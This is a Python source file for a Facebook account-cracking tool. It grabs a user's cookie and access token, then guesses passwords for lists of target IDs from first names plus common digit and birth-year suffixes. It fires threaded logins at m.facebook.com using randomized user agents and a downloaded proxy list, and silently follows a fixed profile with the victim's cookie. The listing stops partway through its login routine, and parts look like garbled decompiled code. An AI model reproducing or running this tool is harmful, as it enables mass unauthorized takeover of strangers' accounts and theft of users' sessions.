
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.tree import Tree
from rich import print as cetak
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.panel import Panel as nel
from rich import print as cetak
from rich.columns import Columns as col
from rich import print as prints
from rich import pretty
from rich.text import Text as tekz
###----------[ WARNA PRINT RICH ]---------- ###
M2 = "[#00FF00]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#00FF00]" # KUNING
B2 = "[#00FF00]" # BIRU
P2 = "[#00FF00]" # PUTIH
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#0000FF]"
	colorbapa = random.choice([H2,K2,M2,B2,P2]) 
	color_panel = "#FF0000"
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
proxxy=[]
cokbrut=[]
ses=requests.Session()
princp=[]

def cek_apk(session,coki):
    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  '%(N,M,N,M,N))
    else:
        print(f'\r[🎮] %s \x1b[1;95m YOUR ACTIVE APPS   :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🎮] %s \x1b[1;95m YOUR EXPIRED APPS    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://m.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://m.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaN8-00/012.002;'
    e=random.randrange(100, 9999)
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku) 
	###----------[ User Agent Linux ]---------- ###
    aa='Mozilla/5.0 (X11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Linux x86_64)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(1000):
    rr = random.randint
    rc = random.choice
    satu = f"Mozilla/5.0 (Linux; Android 12; CPH2127 Build/RKQ1.{str(rr(211111,299999))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
    dua  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; RMX3195 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    tiga  = f"Mozilla/5.0 (Linux; Android 9; vivo 1904 Build/PPR1.{str(rr(111111,199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36 wkbrowser 5.0.17 {str(rr(2111111,2999999))} js 5.1.1 newfocus lng=ru"
    empat  = f"Mozilla/5.0 (Linux; Android 9{str(rr(7,12))}; RMX1811) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    lima  = f"Mozilla/5.0 (Linux; Android 12{str(rr(7,12))}; IN2013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    UserAgentss = str(rc([satu,dua,tiga,empat,lima]))
    ugen.append(UserAgentss)
try:
    url_proxy = random.choice([
              "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
])
except:pass
   
#------------------[ PROXIES ]-------------------#
try:
    url = requests.get(f"{url_proxy}").text
    for ikfar in url.splitlines():proxxy.append(ikfar)
except requests.exceptions.ConnectionError:
   prints(nel(f"{P2} XATAKAW DISCONNECT BWA TKAYA CHAWARE BKA",width=80,padding=(0,2),style=f"{color_panel}"));exit()

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # BLACK
m = '\x1b[1;91m' #GREEN +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def renv_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
        
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03) 
		
		
def clear():
	os.system('clear')
def back():
	login()
	
def none():
	clear()
	prints(nel(f"""\t 
         Made By {M2}KALI-LINUX {P2}CRACK""",width=80,style=f"{color_panel}"))
def info():
	prints(f"""{B2}╭─────────────────────╮{B2}╭───────────────╮
{B2}│ {P2}Author : KALI-LINUX{B2} │{B2}│ {P2}Version : 5.7{B2} │
{B2}╰─────────────────────╯{B2}╰───────────────╯""")
def banner():
	clear()
	prints(nel(f"""\t                                                      
         make By {M2}KALI-LINUX {P2}CRACK""",width=80,style=f"{color_panel}"))
# LOGIN
# new cooki 
def login():
		try:
			token = open('.token.txt','r').read()
			kukis = open('.cok.txt','r').read()
			tokenku.append(token)
			try:
				sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':kukis})
				sy2 = json.loads(sy.text)['name']
				sy3 = json.loads(sy.text)['id']
				menu(sy2,sy3)
			except KeyError:
				login_lagi334()
			except requests.exceptions.ConnectionError:
				banner()
				li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
				lo = mark(li, style='red')
				sol().print(lo, style='cyan')
				exit()
		except IOError:
			login_lagi334()

# LOGIN
def login_lagi334():
	try:
		banner()
		___kontol___ = input('[+] Cookies dane : ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":___kontol___}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(___kontol___)
		print('\n RUN AGAIN ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print('%s# COOKIES ESH NAKA / CP ACCOUNT '%(h))
		exit()
# MENU
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('\033[0m╰─ Expired Cookies ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	print('')
	try:cek_data = requests.get("http://ip-api.com/json/").json()
	except:cek_data = {'-'}
	try:MeledakXd = cek_data["isp"]
	except:MeledakXd = {'-'}
	try:MeledakSu = cek_data["city"]
	except:MeledakSu = {'-'}
	info() 
	prints(nel(f'{P2}Login As %s %s{P2}'%((my_id),MeledakSu),width=80,padding=(0,7),style=f"{color_panel}")) 
	prints(nel(f"""{P2}[{color_text}01{P2}]. Crack FILE       [{color_text}00{P2}]. Exit\n[{color_text}06{P2}]. """,width=80,padding=(0,7),style=f"{color_panel}"))
	Meledak = input(' Chouse : ')
	print('')
	if Meledak in ['1']:
		crack_file()
	elif Meledak in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cok.txt')
		print('╰─ Successfully Logout+Delete Cookies✓√ ')
		exit()
	else:
		print('╰─ input correctly ')
		back()

def crack_file():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    except IOError:
        exit()
    try:
        
        jum = input('╰─ Enter File : ')
        for line in open(jum, 'r').readlines():
            id.append(line.strip())
        print('╰─ ID : '+str(len(id)))
        setting()
    except requests.exceptions.ConnectionError:
            print('╰─ Xat Nya  ')
            exit()
    except (KeyError,IOError):
            print('╰─ Not File')
            time.sleep(3)
            follower()
def setting():
	print('')
	cetak(nel(f"Do You Want Crack Account {M2}old {P2}/{H2} new {P2} / {K2} random {P2} Atau juga {M2}1 {P2}/{H2} 2 {P2}/ {K2}3{P2}",width=80,padding=(0,7),style=f"{color_panel}")) 
	prints(f"""{B2}╭─────────────────────╮   {B2}╭──────────────────╮
{B2}│ {P2}1. CRACK FB OLD {B2}          │{B2}   │      {P2}2. CRACK FB NEW{B2}   │
{B2}╰─────────────────────╯{B2}   ╰──────────────────╯""")
	prints(f"""{B2}╭─────────────────────╮
{B2}│ {P2}3. CRACK FB RANDOM {B2}       │
{B2}╰─────────────────────╯""")
	hu = input('╰─ Choose : ')
	if hu in ['1','old']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif hu in ['2','new']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','random']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('╰─ input correctly ')
		exit()
		print('')
		
	print('')
	prints(nel(f'''\t{P2}[{H2}1{P2}] Methode Mobile\t[{H2}2{P2}] Methode Free\n\t[{H2}3{P2}] Metode Mbasic"''',width=80,style=f"{color_panel}")) 
	hc = input('[•] Choose  : ')
	if hc in ['1','01']:
		method.append('mie')
	elif hc in ['2','02']:
		method.append('sulap')
	elif hc in ['3','03']:
		method.append('passu')
	else:
		method.append('babi')
	su() 
def su():
	prints(nel(f"\t{P2}[{H2}1{P2}].   112233 + 11223 + 12233 [ {K2}SLOW (BEST✓) {P2}]\n\t[{H2}2{P2}].   123 + 12345 + 123456 [ {M2}SLOW {P2}]\n\t[{H2}3{P2}].   0770 + 0750 + 0771  [{H2} VERY SLOW (BEST✓){P2}]\n\t[{H2}4{P2}].   2000 + BIRTH [{H2} FAST {P2}]",width=80,style=f"{color_panel}")) 
	ch = input('[•] Choose  : ')
	if ch in ['1','01']:
		mie()
	elif ch in ['2','02']:
		sulap()
	elif ch in ['3','03']:
		passu()
	elif ch in ['4','04']:
		babi()
	else:
		passu()
def mie():
	global prog,des
	print('')
	print(f'OK{x} Save in : {h}OK/%s {x}'%(okc))
	print(f'CP{x} Save in : {k}CP/%s {x}'%(cpc))
	print('') 
	prints(f' AIRPLANE MODE OPEN EVERY 1000 ID TEST\n')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'0770')
						pwv.append(frs+'0750')
						pwv.append(frs+'0780')
						pwv.append(frs+'1111')
						pwv.append(frs+frs)
						pwv.append(frs+'112233')
						pwv.append(frs+'1223')
						pwv.append(frs+'112233445566')
						pwv.append(frs+'1122334455')
						pwv.append(frs+'11223344')
						pwv.append(frs+'11223')
						pwv.append(frs+'21')
						pwv.append(frs+'321')
						pwv.append(frs+'4321')
						pwv.append(frs+'54321')
						pwv.append(frs+'654321')
						pwv.append(frs+'7654321')
						pwv.append(frs+'87654321')
						pwv.append(frs+'987654321')
						pwv.append(frs+'332211')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'0770')
						pwv.append(frs+'0750')
						pwv.append(frs+'0780')
						pwv.append(frs+'1111')
						pwv.append(frs+frs)
						pwv.append(frs+'112233')
						pwv.append(frs+'1223')
						pwv.append(frs+'112233445566')
						pwv.append(frs+'1122334455')
						pwv.append(frs+'11223344')
						pwv.append(frs+'11223')
						pwv.append(frs+'21')
						pwv.append(frs+'321')
						pwv.append(frs+'4321')
						pwv.append(frs+'54321')
						pwv.append(frs+'654321')
						pwv.append(frs+'7654321')
						pwv.append(frs+'87654321')
						pwv.append(frs+'987654321')
						pwv.append(frs+'332211')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
	print('')
	RODAN = '# WANT TO CHECK THE CRACK RESULT OPTIONS?'
	sol().print(mark(RODAN, style='green'))
	woi = input(x+'['+p+'👽'+x+'] Want to Show Crack Result Options? (y/t) : ')
	if woi in ['y','t']:
		cek_opsi()
	else:
		exit()

def passu():
	global prog,des
	print('')
	print(f'OK{x} Save in : {h}OK/%s {x}'%(okc))
	print(f'CP{x} Save in : {k}CP/%s {x}'%(cpc))
	print('') 
	prints(f' AIRPLANE MODE OPEN EVERY 1000 ID TEST\n')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'0770')
						pwv.append(frs+'0750')
						pwv.append(frs+'0780')
						pwv.append(frs+'1111')
						pwv.append(frs+frs)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'1234567')
						pwv.append(frs+'12345678')
						pwv.append(frs+'123456789')
						pwv.append(frs+'1234567890')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'0770')
						pwv.append(frs+'0750')
						pwv.append(frs+'0780')
						pwv.append(frs+'1111')
						pwv.append(frs+frs)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'1234567')
						pwv.append(frs+'12345678')
						pwv.append(frs+'123456789')
						pwv.append(frs+'1234567890')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
		print('')
	print('')
	KALI = '# WANT TO CHECK THE CRACK RESULT OPTIONS?'
	sol().print(mark(KALI, style='green'))
	woi = input(x+'['+p+'👽'+x+'] Want to Show Crack Result Options? (y/t) : ')
	if woi in ['y','t']:
		cek_opsi()
	else:
		exit()

def passwrd():
	os.system('clear')
	print(logo)
	print('\033[0;1m[ \033[31;1m+ \033[0;1m] HAMU IDEAKAN: \033[32m'+str(len(id))) 
	print('\033[0;1m[ \033[31;1m+ \033[0;1m] HACK DASTE PEKRD \033[0;1m( \033[32mBOSTA W BBENA \033[0;1m)')
	print('\033[0;1m[ \033[31;1m+ \033[0;1m] BO WASTANDNEY TOOL \033[0;1m( \033[32mCTRL+Z \033[0;1m)')
	print('\033[1;91m-------------------------------------------')
	with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'2002')
						pwv.append(frs+'2003')
						pwv.append(frs+'2004')
						pwv.append(frs+'2005')
						pwv.append(frs+'2006')
						pwv.append(frs+'2020')
						pwv.append(frs+'2023')
						pwv.append(frs+'2001')
						pwv.append(frs+'2000')
						pwv.append(frs+'1999')
						pwv.append(frs+'1998')
						pwv.append(frs+'1997')
						pwv.append(frs+'1996')
						pwv.append(frs+'1995')
						pwv.append(frs+'1994')
						pwv.append(frs+'1993')
						pwv.append(frs+'1992')
						pwv.append(frs+'1991')
						pwv.append(frs+'1990')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'2002')
						pwv.append(frs+'2003')
						pwv.append(frs+'2004')
						pwv.append(frs+'2005')
						pwv.append(frs+'2006')
						pwv.append(frs+'2020')
						pwv.append(frs+'2023')
						pwv.append(frs+'2001')
						pwv.append(frs+'2000')
						pwv.append(frs+'1999')
						pwv.append(frs+'1998')
						pwv.append(frs+'1997')
						pwv.append(frs+'1996')
						pwv.append(frs+'1995')
						pwv.append(frs+'1994')
						pwv.append(frs+'1993')
						pwv.append(frs+'1992')
						pwv.append(frs+'1991')
						pwv.append(frs+'1990')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[green] CRACK Fb by stand —> KALI-LINUX [cyan] ✓[white] '))
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
	print('[•] Lanjut Crack Kembali ( Y/t ) ? ')
	woi = input('[•] Pilih : ')
	if woi in ['y','t']:
		back()
	else:
		print(f'\t{x}>>{k} Good By KALI{x} << ')
		time.sleep(2)
		exit()

def sulap():
	global prog,des
	print('')
	print(f'╰─ {h}OK{x} Save in : {h}OK/%s {x}'%(okc))
	print(f'╰─ {k}CP{x} Save in : {k}CP/%s {x}'%(cpc))
	print(f'╰─ AIRPLANE MODE OPEN EVERY 1000 ID TEST\n')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = ['1234554321','1234567890','12345678','1122334455','112233445566','123456']
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'0770')
						pwv.append(frs+'0750')
						pwv.append(frs+'1111')
						pwv.append(frs+frs)	
						pwv.append(frs+'0780')
						pwv.append(frs+'0771')
						pwv.append(frs+'0751')
						pwv.append(frs+'2020')
						pwv.append(frs+'2021')
						pwv.append(frs+'2023')
						pwv.append(frs+'2024')
						pwv.append(frs+'2025')
						pwv.append(frs+'2026')
						pwv.append(frs+'11223')
						pwv.append(frs+'2009')
						pwv.append(frs+'2008')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'0770')
						pwv.append(frs+'1111')
						pwv.append(frs+frs)
						pwv.append(frs+'0750')
						pwv.append(frs+'0780')
						pwv.append(frs+'0771')
						pwv.append(frs+'0751')
						pwv.append(frs+'2020')
						pwv.append(frs+'2021')
						pwv.append(frs+'2023')
						pwv.append(frs+'2024')
						pwv.append(frs+'2025')
						pwv.append(frs+'2026')
						pwv.append(frs+'11223')
						pwv.append(frs+'2009')
						pwv.append(frs+'2008')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
	print('')
	KALI = '# WANT TO CHECK THE CRACK RESULT OPTIONS?'
	sol().print(mark(KALI, style='green'))
	woi = input(x+'['+p+'👽'+x+'] Want to Show Crack Result Options? (y/t) : ')
	if woi in ['y','t']:
		cek_opsi()
	else:
		exit()

def babi():
	global prog,des
	print('')
	print(f'╰─ {h}OK{x} Save in : {h}OK/%s {x}'%(okc))
	print(f'╰─ {k}CP{x} Save in : {k}CP/%s {x}'%(cpc))
	print(f'╰─ AIRPLANE MODE OPEN EVERY 1000 ID TEST\n')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'0770')
						pwv.append(frs+'1111')
						pwv.append(frs+frs)
						pwv.append(frs+'0750')
						pwv.append(frs+'0771')
						pwv.append(frs+'0751')
						pwv.append(frs+'2002')
						pwv.append(frs+'2003')
						pwv.append(frs+'2004')
						pwv.append(frs+'2005')
						pwv.append(frs+'2006')
						pwv.append(frs+'2020')
						pwv.append(frs+'2023')
						pwv.append(frs+'2001')
						pwv.append(frs+'2000')
						pwv.append(frs+'1999')
						pwv.append(frs+'1998')
						pwv.append(frs+'1997')
						pwv.append(frs+'1996')
						pwv.append(frs+'1995')
						pwv.append(frs+'1994')
						pwv.append(frs+'1993')
						pwv.append(frs+'1992')
						pwv.append(frs+'1991')
						pwv.append(frs+'1990')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'0770')
						pwv.append(frs+'1111')
						pwv.append(frs+frs)
						pwv.append(frs+'0750')
						pwv.append(frs+'0771')
						pwv.append(frs+'0751')
						pwv.append(frs+'2002')
						pwv.append(frs+'2003')
						pwv.append(frs+'2004')
						pwv.append(frs+'2005')
						pwv.append(frs+'2006')
						pwv.append(frs+'2020')
						pwv.append(frs+'2023')
						pwv.append(frs+'2001')
						pwv.append(frs+'2000')
						pwv.append(frs+'1999')
						pwv.append(frs+'1998')
						pwv.append(frs+'1997')
						pwv.append(frs+'1996')
						pwv.append(frs+'1995')
						pwv.append(frs+'1994')
						pwv.append(frs+'1993')
						pwv.append(frs+'1992')
						pwv.append(frs+'1991')
						pwv.append(frs+'1990')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
		print('')
		cetak('╰─ Sucses Cracked %s Ok:%s Cp:%s Akuntod'%((len(id)),ok,cp))
		print('')
# Mobile 
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white] KALI-LINUX  {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ses = requests.Session()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=222161937813280&kid_directed_site=0&app_id=222161937813280&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D222161937813280%26redirect_uri%3Dhttps%253A%252F%252Faccount.xiaomi.com%252Fpass%252Fsns%252Flogin%252Fload%26state%3DSTATE_248222%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D11699442-ce8e-4d69-8952-fb5f6b0c3d12%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccount.xiaomi.com%2Fpass%2Fsns%2Flogin%2Fload%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DSTATE_248222%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
